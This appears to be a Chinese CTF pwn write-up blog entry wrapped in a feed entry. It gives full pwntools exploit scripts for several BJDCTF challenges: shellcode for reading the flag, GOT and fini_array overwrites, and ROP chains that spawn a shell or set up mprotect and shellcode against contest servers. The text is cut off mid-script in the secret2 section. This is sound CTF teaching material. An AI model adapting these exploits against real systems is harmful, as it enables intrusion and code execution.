    <link href="https://nocbtm.github.io/2020/05/25/BJDCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/05/25/BJDCTF-pwn-writeup/</id>
    <published>2020-05-25T02:24:25.000Z</published>
    <updated>2020-05-25T03:56:16.569Z</updated>
    
    <content type="html"><![CDATA[<h2 id="盲打1-盲打2"><a href="#盲打1-盲打2" class="headerlink" title="盲打1 盲打2"></a>盲打1 盲打2</h2><p>都是一个c语言解释器，但是不能用<code>()</code>来写c语言，也就是不能调用函数，可以用shellcode的方式来写 orw flag,</p><p>原理参考<a href="https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/">对hello world的重新认识</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10002</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">orw = asm(shellcraft.open("/home/ctf/flag", 0))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.read(3, "rsp", 0x20))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.write(1, "rsp", 0x20))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.exit(0))</span></span><br><span class="line"><span class="string">print '\\x'+hex(ord(orw[0]))[2:]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">orw2=asm(</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        mov rax,0x2c2c2c2c2c2c       </span></span><br><span class="line"><span class="string">        mov rbx,0x4b4d404a034a  </span></span><br><span class="line"><span class="string">        xor rax, rbx</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax,0x2c2c2c35352c2c2c</span></span><br><span class="line"><span class="string">        mov rbx,0x584f035058434403    </span></span><br><span class="line"><span class="string">        xor rax,rbx</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi,rsp</span></span><br><span class="line"><span class="string">        mov esi,0x0</span></span><br><span class="line"><span class="string">        mov eax,0x2</span></span><br><span class="line"><span class="string">        xor ecx,ecx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,rax</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x50</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,0x1</span></span><br><span class="line"><span class="string">        mov rax,0x1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\\x'</span>+hex(ord(orw2[<span class="number">0</span>]))[<span class="number">2</span>:]</span><br><span class="line">payload=<span class="string">'const char main='</span>+str(hex(ord(orw2[<span class="number">0</span>])))+<span class="string">','</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(orw2)):</span><br><span class="line">    <span class="keyword">if</span> i != len(orw2)<span class="number">-1</span>:</span><br><span class="line">        payload+=<span class="string">'w'</span>+str(i)+<span class="string">'='</span>+str(hex(ord(orw2[i])))+<span class="string">','</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=<span class="string">'w'</span>+str(i)+<span class="string">'='</span>+str(hex(ord(orw2[i])))+<span class="string">';'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">pause()</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">p.recvuntil(<span class="string">"(end with '@')"</span>)</span><br><span class="line">p.sendline(payload+<span class="string">'@'</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.can_recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory Monster I"></a>Memory Monster I</h2><p>任意地址写，故意栈溢出然后会调用<code>__stack_chk_fail</code>函数，修改<code>__stack_chk_fail</code>的got表为后门即可</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_I"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10081</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x4011EB)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x404028</span>)+<span class="string">"\x00"</span>*<span class="number">0xc0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x40124A</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory Monster II"></a>Memory Monster II</h2><p>静态编译了,fini_array劫持为onegadget即可，onegadget苦苦找寻了好久，找到了一个有效的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_II"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10102</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x46F37F)</span></span><br><span class="line">dbg(<span class="number">0x4B80B8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x4B80B0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x46F37F</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>另一种做法参考<a href="https://fmyy.pro/2020/05/23/Competition/DASCTF-May/" target="_blank" rel="noopener">fmmy</a>师傅题解</p><p>fini_array劫持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0]:__libc_csu_fini</span><br><span class="line">fini_array[1]:main函数地址</span><br></pre></td></tr></table></figure><p>之后则可以形成一个循环链,然后任意地址写,可以在fini_array[2]之后构建ROP链,最后再将fini_array[0]改成leave_ret,fini_array[1]改成ret执行后续ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span><br><span class="line">p.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">m(<span class="number">0x4B80B0</span>,p64(<span class="number">0x402CB0</span>) + p64(<span class="number">0x401C1D</span>))</span><br><span class="line">pop_rdx_rsi = <span class="number">0x44BAF9</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41B380</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x448415</span></span><br><span class="line">syscall = <span class="number">0x46F745</span></span><br><span class="line">binsh = <span class="number">0x492895</span></span><br><span class="line">leave_ret = <span class="number">0x401CF3</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span>,p64(pop_rdx_rsi) + p64(<span class="number">59</span>) + p64(<span class="number">0</span>))</span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(mov_rax_rdx) + p64(pop_rdi_ret) + p64(binsh))</span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall))</span><br><span class="line">m(<span class="number">0x4B80B0</span>,p64(leave_ret) + p64(ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-III"><a href="#Memory-Monster-III" class="headerlink" title="Memory Monster III"></a>Memory Monster III</h2><p>这道题当时没有做出来，赛后参考taqini师傅博客，有学到了新的姿势</p><p><a href="http://taqini.space/2020/02/14/play-ROP-with-fini-array/#0x0-背景" target="_blank" rel="noopener">通过利用fini_array部署并启动ROP攻击</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_III"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port=<span class="string">'183.129.189.60'</span>,<span class="number">10008</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span><br><span class="line">p.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">m(<span class="number">0x4B50B0</span>,p64(<span class="number">0x402CA0</span>) + p64(<span class="number">0x401C1D</span>))</span><br><span class="line"></span><br><span class="line">pop_rdx_rsi = <span class="number">0x44AB09</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41AE80</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x447635</span></span><br><span class="line">leave_ret = <span class="number">0x401CF3</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">mprotect = <span class="number">0x448420</span></span><br><span class="line">read = <span class="number">0x447620</span></span><br><span class="line"></span><br><span class="line">shell_a = <span class="number">0x4BC100</span></span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span>,p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(<span class="number">0x200</span>) + p64(shell_a) + p64(read))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdi_ret) + p64(shell_a <span class="number">-0x100</span>) + p64(pop_rdx_rsi))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(mprotect))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(shell_a))</span><br><span class="line">m(<span class="number">0x4B50B0</span>,p64(leave_ret) + p64(ret) + p64(pop_rdi_ret))</span><br><span class="line"></span><br><span class="line">p.sendline(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h2><p>文件描述符最多有1024个，也就是说最多打开文件1024多次,就不能继续打开了,则随机值之后全是0,因此输入”\x00”字节就能通过memcmp检测，然后close(0)，memcpy栈溢出， 只能orw flag了，并且此题远程是2.30的。2.23本地调试的时候有点不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># --- auther nocbtm ---</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">pwn_name = <span class="string">"secret3"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10056</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.30-0ubuntu2_amd64.so'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span><span class="params">(gadget1,gadget2,func_got,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx read size</span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi read canshu</span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x401433)</span></span><br><span class="line">rdi=<span class="number">0x40161b</span></span><br><span class="line">ret=<span class="number">0x401016</span></span><br><span class="line">rsi_r15=<span class="number">0x401619</span></span><br><span class="line">bss=elf.bss()+<span class="number">0x300</span></span><br><span class="line">p.recvuntil(<span class="string">"name? ________________ #"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>+p64(<span class="number">0x4021df</span>)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0x4021df</span>)+p64(rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">"open"</span>])</span><br><span class="line">payload+=cus_rop(<span class="number">0x401612</span>,<span class="number">0x4015F8</span>,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,bss,<span class="number">64</span>)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(elf.plt[<span class="string">"write"</span>])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1255</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    payload=<span class="string">"\x00"</span></span><br><span class="line">    p.recvuntil(<span class="string">"Secret: _____            #"</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1254</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        